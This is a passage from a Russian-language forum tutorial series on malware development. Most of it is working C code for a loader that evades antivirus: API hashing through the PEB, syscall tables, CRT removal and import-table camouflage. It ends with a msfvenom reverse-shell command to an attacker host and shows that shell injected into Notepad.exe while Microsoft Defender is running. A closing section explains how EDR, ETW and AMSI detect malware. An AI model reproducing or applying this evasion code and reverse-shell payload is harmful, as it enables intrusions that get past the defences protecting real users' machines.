    PDWORD            FunctionNameArray       = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfNames);
    PDWORD            FunctionAddressArray    = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfFunctions);
    PWORD            FunctionOrdinalArray    = (PWORD)(pBase + pImgExportDir-&gt;AddressOfNameOrdinals);

    for (DWORD i = 0; i &lt; pImgExportDir-&gt;NumberOfFunctions; i++) {
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
        PVOID    pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

        // Хэшируем каждое имя функции `pFunctionName`
        // Если оба хэша равны, то мы нашли нужную функцию
        if (dwApiNameHash == HASHA(pFunctionName)) {
            return pFunctionAddress;
        }
    }

    return NULL;
}

HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {

    if (dwModuleNameHash == NULL)
        return NULL;

#ifdef _WIN64
    PPEB            pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
    PPEB            pPeb = (PEB*)(__readfsdword(0x30));
#endif

    PPEB_LDR_DATA            pLdr = (PPEB_LDR_DATA)(pPeb-&gt;Ldr);
    PLDR_DATA_TABLE_ENTRY    pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr-&gt;InMemoryOrderModuleList.Flink);

    while (pDte) {

        if (pDte-&gt;FullDllName.Length != NULL &amp;&amp; pDte-&gt;FullDllName.Length &lt; MAX_PATH) {

            // Преобразование `FullDllName.Buffer` в строку верхнего регистра
            CHAR UpperCaseDllName[MAX_PATH];

            DWORD i = 0;
            while (pDte-&gt;FullDllName.Buffer[i]) {
                UpperCaseDllName[i] = (CHAR)toupper(pDte-&gt;FullDllName.Buffer[i]);
                i++;
            }
            UpperCaseDllName[i] = &#039;\0&#039;;

            // Хэшируем `UpperCaseDllName` и сравниваем значение хэша с входным `dwModuleNameHash`
            if (HASHA(UpperCaseDllName) == dwModuleNameHash)
                return (HMODULE)(pDte-&gt;InInitializationOrderLinks.Flink);
        }
        else {
            break;
        }

        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
    }

    return NULL;
}</code></pre>
	</div>
</div><br />
<b>Файл заголовка</b><br />
<br />
Перед продолжением необходимо создать новый файл заголовка, typedef.h, чтобы определить используемые WinAPI в виде указателей на функции для ясности и возможности поддержки. Common.h будет необходимо включить файл заголовка typedef.h с помощью #include &quot;typedef.h&quot;.<br />
<br />
typedef.h<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#pragma once
#include &lt;Windows.h&gt;
typedef ULONGLONG(WINAPI* fnGetTickCount64)();

typedef HANDLE(WINAPI* fnOpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);

typedef LRESULT(WINAPI* fnCallNextHookEx)(HHOOK hhk, int nCode, WPARAM wParam, LPARAM lParam);

typedef HHOOK(WINAPI* fnSetWindowsHookExW)(int idHook, HOOKPROC lpfn, HINSTANCE hmod, DWORD dwThreadId);

typedef BOOL(WINAPI* fnGetMessageW)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);

typedef LRESULT(WINAPI* fnDefWindowProcW)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);

typedef BOOL(WINAPI* fnUnhookWindowsHookEx)(HHOOK hhk);

typedef DWORD(WINAPI* fnGetModuleFileNameW)(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);

typedef HANDLE(WINAPI* fnCreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);

typedef BOOL(WINAPI* fnSetFileInformationByHandle)(HANDLE hFile, FILE_INFO_BY_HANDLE_CLASS FileInformationClass, LPVOID lpFileInformation, DWORD dwBufferSize);

typedef BOOL(WINAPI* fnCloseHandle)(HANDLE hObject);</code></pre>
	</div>
</div><br />
<b>Структура API_HASHING</b><br />
<br />
Далее в Common.h определяется новая структура API_HASHING, которая используется для хранения адресов используемых WinAPI, делая их более доступными для использования в функциях реализации.<br />
<br />
Common.h<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef struct _API_HASHING {

    fnGetTickCount64                pGetTickCount64;
    fnOpenProcess                   pOpenProcess;
    fnCallNextHookEx                pCallNextHookEx;
    fnSetWindowsHookExW             pSetWindowsHookExW;
    fnGetMessageW                   pGetMessageW;
    fnDefWindowProcW                pDefWindowProcW;
    fnUnhookWindowsHookEx           pUnhookWindowsHookEx;
    fnGetModuleFileNameW            pGetModuleFileNameW;
    fnCreateFileW                   pCreateFileW;
    fnSetFileInformationByHandle    pSetFileInformationByHandle;
    fnCloseHandle                   pCloseHandle;

} API_HASHING, *PAPI_HASHING;</code></pre>
	</div>
</div><br />
<b>Обновление VX_Table </b><br />
<br />
Функции GetModuleHandleH и GetProcAddressH должны быть использованы для инициализации элементов структуры API_HASHING. Затем функция InitializeSyscalls использует эти функции для инициализации структуры VX_TABLE, которая используется для вызова syscalls.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// ...

API_HASHING g_Api = {0};

BOOL InitializeSyscalls() {

// Получить PEB
PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
PPEB pCurrentPeb = pCurrentTeb-&gt;ProcessEnvironmentBlock;
if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb-&gt;OSMajorVersion != 0xA)
    return FALSE;

// Получить модуль NTDLL
PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);

// Получить EAT из NTDLL
PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
if (!GetImageExportDirectory(pLdrDataEntry-&gt;DllBase, &amp;pImageExportDirectory) || pImageExportDirectory == NULL)
    return FALSE;

g_Sys.NtCreateSection.uHash          = NtCreateSection_JOAA;
g_Sys.NtMapViewOfSection.uHash       = NtMapViewOfSection_JOAA;
g_Sys.NtUnmapViewOfSection.uHash     = NtUnmapViewOfSection_JOAA;
g_Sys.NtClose.uHash                  = NtClose_JOAA;
g_Sys.NtCreateThreadEx.uHash         = NtCreateThreadEx_JOAA;
g_Sys.NtWaitForSingleObject.uHash    = NtWaitForSingleObject_JOAA;
g_Sys.NtQuerySystemInformation.uHash = NtQuerySystemInformation_JOAA;
g_Sys.NtDelayExecution.uHash         = NtDelayExecution_JOAA;

// Инициализировать syscalls
if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtCreateSection))
    return FALSE;
if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtMapViewOfSection))
    return FALSE;
if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtUnmapViewOfSection))
    return FALSE;
if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtClose))
    return FALSE;
if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtCreateThreadEx))
    return FALSE;
if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtWaitForSingleObject))
    return FALSE;
if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtQuerySystemInformation))
    return FALSE;
if (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;g_Sys.NtDelayExecution))
    return FALSE;

// Экспортированный User32.dll
g_Api.pCallNextHookEx      = (fnCallNextHookEx)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), CallNextHookEx_JOAA);
g_Api.pDefWindowProcW      = (fnDefWindowProcW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), DefWindowProcW_JOAA);
g_Api.pGetMessageW         = (fnGetMessageW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), GetMessageW_JOAA);
g_Api.pSetWindowsHookExW   = (fnSetWindowsHookExW)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), SetWindowsHookExW_JOAA);
g_Api.pUnhookWindowsHookEx = (fnUnhookWindowsHookEx)GetProcAddressH(GetModuleHandleH(USER32DLL_JOAA), UnhookWindowsHookEx_JOAA);

if (g_Api.pCallNextHookEx == NULL || g_Api.pDefWindowProcW == NULL || g_Api.pGetMessageW == NULL || g_Api.pSetWindowsHookExW == NULL || g_Api.pUnhookWindowsHookEx == NULL)
    return FALSE;

// Экспортированный Kernel32.dll
g_Api.pGetModuleFileNameW          = (fnGetModuleFileNameW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetModuleFileNameW_JOAA);
g_Api.pCloseHandle                 = (fnCloseHandle)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), CloseHandle_JOAA);
g_Api.pCreateFileW                 = (fnCreateFileW)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), CreateFileW_JOAA);
g_Api.pGetTickCount64              = (fnGetTickCount64)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetTickCount64_JOAA);
g_Api.pOpenProcess                 = (fnOpenProcess)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), OpenProcess_JOAA);
g_Api.pSetFileInformationByHandle  = (fnSetFileInformationByHandle)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), SetFileInformationByHandle_JOAA);

if (g_Api.pGetModuleFileNameW == NULL || g_Api.pCloseHandle == NULL || g_Api.pCreateFileW == NULL || g_Api.pGetTickCount64 == NULL || g_Api.pOpenProcess == NULL || g_Api.pSetFileInformationByHandle == NULL)
    return FALSE;

return TRUE;
}</code></pre>
	</div>
</div><br />
Хеши WinAPI генерируются проектом Hasher, как показано ниже.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788266390.png"
		data-src="https://osint42.org/attachments/1746788266390-png.268/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788266390-png.268/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788266390.png"
			title="1746788266390.png"
			width="1099" height="445" loading="lazy" />
	</div><br />
<br />
Следующий шаг - использовать структуру g_Api для вызова всех функций WinAPI, добавив перед каждой из них префикс g_Api.&lt;WinAPI&gt;. Например, функция OpenProcess должна вызываться как g_Api.pOpenProcess.<br />
<br />
<b>Ошибка хеширования API SystemFunction032</b><br />
<br />
При попытке применить хеширование API к функции SystemFunction032 (которая не включена в структуру g_Api), произойдет следующее исключение.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788273799.png"
		data-src="https://osint42.org/attachments/1746788273799-png.269/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788273799-png.269/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788273799.png"
			title="1746788273799.png"
			width="1371" height="345" loading="lazy" />
	</div><br />
<br />
При попытке выполнить SystemFunction032 по адресу 0x00007FFC42C09FF2 выбрасывается исключение. Похоже, это действительный адрес, так как он извлекается с помощью следующей строки кода:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddressH(LoadLibraryA(&quot;Advapi32&quot;), SystemFunction032_JOAA);</code></pre>
	</div>
</div><br />
Используйте xdbg, чтобы проверить адрес и понять причину проблемы<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788282045.png"
		data-src="https://osint42.org/attachments/1746788282045-png.270/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788282045-png.270/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788282045.png"
			title="1746788282045.png"
			width="1242" height="187" loading="lazy" />
	</div><br />
<br />
<b>Функции переадресации</b><br />
<br />
Адрес, полученный с помощью GetProcAddressH, не указывает на функцию, а указывает на строку &quot;CRYPTSP.SystemFunction032&quot;. Это указывает на наличие функции переадресации, когда функция, экспортированная из одной DLL (DLL A), находится в другой DLL (DLL B).<br />
<br />
Таким образом, вместо загрузки Advapi32.dll (DLL A) для поиска SystemFunction032 следует загрузить Cryptsp.dll (DLL B), так как он содержит фактический адрес. Это указывается строкой &quot;CRYPTSP.SystemFunction032&quot;, которая дает намек на расположение функции. Это необходимо, потому что GetProcAddressH не обрабатывает функции переадресации. Внесением этого незначительного изменения код теперь будет успешно компилироваться и выполняться.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788289654.png"
		data-src="https://osint42.org/attachments/1746788289654-png.271/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788289654-png.271/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788289654.png"
			title="1746788289654.png"
			width="1649" height="614" loading="lazy" />
	</div><br />
<br />
<b>Удаление библиотеки CRT</b><br />
<br />
Следуя инструкциям, описанным в Уменьшение вероятности детекта зверька | Цикл статей &quot;Изучение вредоносных программ&quot;, можно удалить библиотеку CRT.<br />
<br />
Ошибка возникнет из-за использования функций printf и wprintf. Чтобы решить эту проблему, можно использовать пользовательскую функцию для замены этих функций. Функциональность печати будет включена только при включенном режиме отладки. Замены функций printf и wprintf следует сохранить в новом файле с именем Debug.h, который должен быть включен во все файлы, которые вызывают printf или wprintf.<br />
<br />
<b>Debug.h:</b><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#pragma once#include &lt;Windows.h&gt;// uncomment to enable debug mode
//\
#define DEBUG



#ifdef DEBUG// wprintf replacement
#define PRINTW( STR, ... )                                                                  \
    if (1) {                                                                                \
        LPWSTR buf = (LPWSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );         \
        if ( buf != NULL ) {                                                                \
            int len = wsprintfW( buf, STR, __VA_ARGS__ );                                   \
            WriteConsoleW( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
            HeapFree( GetProcessHeap(), 0, buf );                                           \
        }                                                                                   \
    }  // printf replacement
#define PRINTA( STR, ... )                                                                  \
    if (1) {                                                                                \
        LPSTR buf = (LPSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );           \
        if ( buf != NULL ) {                                                                \
            int len = wsprintfA( buf, STR, __VA_ARGS__ );                                   \
            WriteConsoleA( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
            HeapFree( GetProcessHeap(), 0, buf );                                           \
        }                                                                                   \
    }  #endif // DEBUG</code></pre>
	</div>
</div><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// Only print if debug mode is enabled
#ifdef DEBUGPRINTA(&quot;...&quot;);
#endif</code></pre>
	</div>
</div><br />
Если попытаться скомпилировать после этого, появятся другие ошибки, потому что функции memcpy, memset, toupper также импортируются из библиотеки CRT. Чтобы исправить эту проблему, необходимо добавить пользовательские функции, которые будут выполнять ту же логику. Эти функции должны быть сохранены в файле WinApi.c, который показан ниже.<br />
<br />
<b>WinApi.c</b><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>CHAR _toUpper(CHAR C)
{
    if (C &gt;= &#039;a&#039; &amp;&amp; C &lt;= &#039;z&#039;)
        return C - &#039;a&#039; + &#039;A&#039;;

    return C;
}

PVOID _memcpy(PVOID Destination, PVOID Source, SIZE_T Size)
{
    for (volatile int i = 0; i &lt; Size; i++) {
        ((BYTE*)Destination)[i] = ((BYTE*)Source)[i];
    }
    return Destination;
}

extern void* __cdecl memset(void*, int, size_t);
#pragma intrinsic(memset)#pragma function(memset)void* __cdecl memset(void* Destination, int Value, size_t Size) {
    unsigned char* p = (unsigned char*)Destination;
    while (Size &gt; 0) {
        *p = (unsigned char)Value;
        p++;
        Size--;
    }
    return Destination;
}</code></pre>
	</div>
</div><br />
Есть еще одна ошибка, которую нужно решить: неопределенный символ _fltused. Символ _fltused - это глобальная переменная в библиотеке CRT, которая используется для определения, были ли в программе использованы операции с плавающей запятой. Создав новую переменную с именем _fltused и установив ее значение на ноль, ошибка будет исправлена. Это отражает инициализацию переменной библиотекой CRT, что приведет к тому, что компилятор построит проект без ошибок.<br />
<br />
<b>Камуфляж IAT</b><br />
<br />
В качестве последнего шага следует добавить заголовочный файл IatCamouflage.h, который содержит тот же код, что представлен тут Уменьшение вероятности детекта зверька | Цикл статей &quot;Изучение вредоносных программ&quot;.<br />
<br />
IatCamouflage.h должен быть включен только в файл main.c и вызван в начале основной функции, чтобы таблица адресов импорта реализации выглядела добросовестно.<br />
<br />
<b>Финальный результат</b><br />
<br />
Эта демонстрация использует обратный TCP-шелл от Msfvenom, который генерируется с помощью команды, представленной ниже.<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		Код:<button class="copy-button tagItem">Скопировать в буфер обмена</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.16.111 LPORT=4444 -f raw -o reverse.bin</code></pre>
	</div>
</div><br />
IAT AV.exe показан ниже.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788838402.png"
		data-src="https://osint42.org/attachments/1746788838402-png.307/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788838402-png.307/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788838402.png"
			title="1746788838402.png"
			width="1279" height="756" loading="lazy" />
	</div><br />
<br />
Далее AV.exe внедряется в Notepad.exe с включенным Microsoft Defender.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788846084.png"
		data-src="https://osint42.org/attachments/1746788846084-png.308/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788846084-png.308/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788846084.png"
			title="1746788846084.png"
			width="1920" height="992" loading="lazy" />
	</div><br />
<br />
Успешное обратное соединение устанавливается с атакующей машиной, и выполняется демонстрационная команда.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788869984.png"
		data-src="https://osint42.org/attachments/1746788869984-png.309/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788869984-png.309/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788869984.png"
			title="1746788869984.png"
			width="1444" height="817" loading="lazy" />
	</div><br />
<br />
Процесс Notepad.exe имеет PID 20288, который совпадает с PID на предыдущем изображении.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788877409.png"
		data-src="https://osint42.org/attachments/1746788877409-png.310/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788877409-png.310/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788877409.png"
			title="1746788877409.png"
			width="1444" height="537" loading="lazy" />
	</div></div>
						

							<h2>Про Endpoint Detection and Response (EDR)</h2>

							

							

							<div class="bbWrapper"><b>Введение </b><br />
<br />
Endpoint Detection and Response (EDR) — это решение безопасности, которое обнаруживает и реагирует на угрозы вроде вымогательского ПО и вредоносного программного обеспечения. Его работа основана на постоянном мониторинге конечных точек в поисках подозрительной активности путем сбора данных о таких событиях, как системные журналы, сетевой трафик, межпроцессное взаимодействие (IPC), вызовы RPC, попытки аутентификации и активность пользователя.<br />
<br />
Установив EDR на конечные точки, вы будете собирать данные, которые затем будут анализироваться и коррелироваться для выявления потенциальных угроз. Когда угроза обнаружена, решения EDR могут автоматически реагировать, например, изолируя затронутую конечную точку от сети или предпринимая другие предопределенные действия, такие как удаление вредоносных файлов или завершение подозрительных процессов.<br />
<br />
Кроме того, EDR будут запускать программы в изолированных средах, а затем продолжат мониторить их на предмет вредоносного поведения.<br />
<br />
EDR следует использовать как часть большей стратегии кибербезопасности и вместе с другими решениями, такими как файрволы, системы обнаружения вторжений (IDS), системы предотвращения вторжений (IPS) и решения для управления информацией и событиями безопасности (SIEM). Эксперты по кибербезопасности также используют журналы EDR для поиска угроз и IoC, которые могли бы быть упущены решением.<br />
<br />
<b>Как работают EDR</b><br />
<br />
Агент EDR обычно состоит из двух частей: приложения в режиме пользователя и драйвера в режиме ядра. Эти части собирают информацию различными способами, упомянутыми ранее.<br />
<br />
Собранные данные затем анализируются и сравниваются с сигнатурами и вредоносным поведением. Обнаружив вредоносное или подозрительное поведение, EDR будет регистрировать это в панели безопасности. Настройки EDR очень настраиваемы, и в зависимости от их настроек он может либо предпринимать действие самостоятельно, либо просто предоставлять предупреждение. Ниже представлено изображение из одной из статей Microsoft, показывающее панель безопасности для Microsoft Defender For Endpoint с несколькими оповещениями.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746795096801.png"
		data-src="https://osint42.org/attachments/1746795096801-png.312/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746795096801-png.312/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746795096801.png"
			title="1746795096801.png"
			width="1857" height="564" loading="lazy" />
	</div><br />
<br />
<b>Обнаружение по сигнатурами</b><br />
<br />
Помните, что антивирусы, как правило, ограничиваются базовым обнаружением по сигнатурам и могут быть легко обойдены. Хотя EDR намного сложнее и содержит больше функций, он включает в себя функции AV для обнаружения известного вредоносного ПО. Более того, защитники могут расширить возможности обнаружения EDR, создавая пользовательские правила.<br />
<br />
<b>Обнаружение на основе поведения</b><br />
<br />
Обнаружение на основе поведения и в реальном времени - одна из основных функций EDR. Он может мониторить запущенные процессы несколькими методами, которые упоминаются ниже.<br />
<br />
<b>Перехват в пользовательском режиме (Userland Hooking)</b><br />
<br />
EDR используют перехват в пользовательском режиме для обнаружения вредоносных аргументов, переданных функциям, а также для просмотра полезных нагрузок после их расшифровки. Ниже представленное изображение дополнительно иллюстрирует перехват в пользовательском режиме в действии.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746795106550.png"
		data-src="https://osint42.org/attachments/1746795106550-png.313/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746795106550-png.313/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746795106550.png"
			title="1746795106550.png"
			width="1306" height="651" loading="lazy" />
	</div><br />
<br />
<b>Отслеживание событий для Windows (ETW)</b><br />
<br />
ETW или Отслеживание событий для Windows - это механизм в режиме ядра, встроенный в операционную систему Windows, который отслеживает и записывает события, которые инициируются драйверами и приложениями в режиме пользователя на текущей системе.<br />
<br />
Следующее изображение взято из статьи Microsoft &quot;Инструментирование вашего кода с помощью ETW&quot;, на котором показана архитектура ETW.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746795113875.png"
		data-src="https://osint42.org/attachments/1746795113875-png.314/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746795113875-png.314/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746795113875.png"
			title="1746795113875.png"
			width="1283" height="932" loading="lazy" />
	</div><br />
<br />
<b>Отслеживание событий для Windows (ETW)</b><br />
<br />
ETW может регистрировать события, такие как создание и завершение процесса, загрузка и выгрузка драйверов устройств, доступ к файлам и реестру, а также события ввода пользователя. Он также может захватывать сетевые события, регистрируя установленные соединения и запросы аутентификации.<br />
<br />
EDR могут использовать этот встроенный механизм для дальнейшего расширения своих возможностей по сбору информации о конкретной конечной точке. С другой стороны, такие инструменты, как Sysmon и Procmon, также используют ETW.<br />
<br />
<b>Интерфейс сканирования против вредоносного ПО (AMSI)</b><br />
<br />
AMSI или Интерфейс сканирования против вредоносного ПО - это еще один механизм безопасности, встроенный в операционную систему Windows, начиная с Windows 10. Он позволяет стороннему программному обеспечению интегрироваться с ним и сканировать и обнаруживать вредоносные приложения.<br />
<br />
Следующее изображение взято из статьи Microsoft &quot;Как интерфейс сканирования против вредоносного ПО (AMSI) помогает вам защищаться от вредоносного ПО&quot;, на котором визуализирована архитектура AMSI.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746795124318.png"
		data-src="https://osint42.org/attachments/1746795124318-png.315/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746795124318-png.315/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746795124318.png"
			title="1746795124318.png"
			width="727" height="321" loading="lazy" />
	</div><br />
<br />
С помощью AMSI программное обеспечение безопасности способно анализировать скрипты, код и сборки .NET, которые выполняются и динамически внедряются, такие как написанные на JavaScript, VBScript, PowerShell или других языках сценариев. Кроме того, AMSI может сканировать сборки .NET, которые являются программами, созданными с использованием фреймворка Microsoft .NET и написанными на C# и VB.NET.<br />
<br />
AMSI используется через группу API, которые Microsoft классифицирует следующим образом:<br />
<br />
<a href="https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-enumerations" target="_blank" class="link link--external" rel="noopener">Перечисления интерфейса сканирования против вредоносного ПО</a> - перечисления, используемые элементами программирования AMSI.<br />
<br />
<a href="https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-functions" target="_blank" class="link link--external" rel="noopener">Функции интерфейса сканирования против вредоносного ПО</a> - функции, которые приложение может вызвать для запроса сканирования. На изображении ниже показаны доступные функции сканирования AMSI.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746795153198.png"
		data-src="https://osint42.org/attachments/1746795153198-png.316/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746795153198-png.316/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746795153198.png"
			title="1746795153198.png"
			width="879" height="397" loading="lazy" />
	</div><br />
<br />
<a href="https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-interfaces" target="_blank" class="link link--external" rel="noopener">Отслеживание событий для противовирусного сканирования (AMSI)</a> Интерфейсы интерфейса сканирования против вредоносного ПО - это COM-интерфейсы, составляющие API AMSI.<br />
<br />
<b>Основная реализация API</b><br />
<br />
AMSI предоставляется через amsi.dll, который является основной DLL, используемой AMSI для выполнения своих операций (ссылаясь на вышеупомянутые функции). Подсистема безопасности операционной системы и сторонние продукты безопасности, интегрированные с AMSI, - это еще два набора DLL, используемых AMSI.<br />
<br />
<b>Обнаружение в памяти</b><br />
<br />
Обнаружения в основе памяти относятся к IoC и сигнатурам, которые создаются после выполнения вашей полезной нагрузки.<br />
Эти IoC могут быть выделениями кучи, трамплинами при подключении API, стеками потоков и секциями памяти RWX.<br />
<br />
Детект происходит после выполнения, когда выполняется полезная нагрузка, где можно вносить изменения в ее расположение в памяти.<br />
<b>Обнаружение в памяти</b> - это продвинутая концепция и один из самых эффективных способов обнаружения выполнения вредоносного кода.<br />
<br />
<b>Обратные вызовы ядра и драйверы Minifilter</b><br />
<br />
Обратные вызовы ядра - это механизм, используемый в операционной системе Windows, который позволяет коду в режиме ядра регистрировать функции, которые будут вызываться ОС в определенные моменты или когда происходит событие. Некоторые примеры событий: создание файла, изменение ключа реестра и загрузка DLL.<br />
<br />
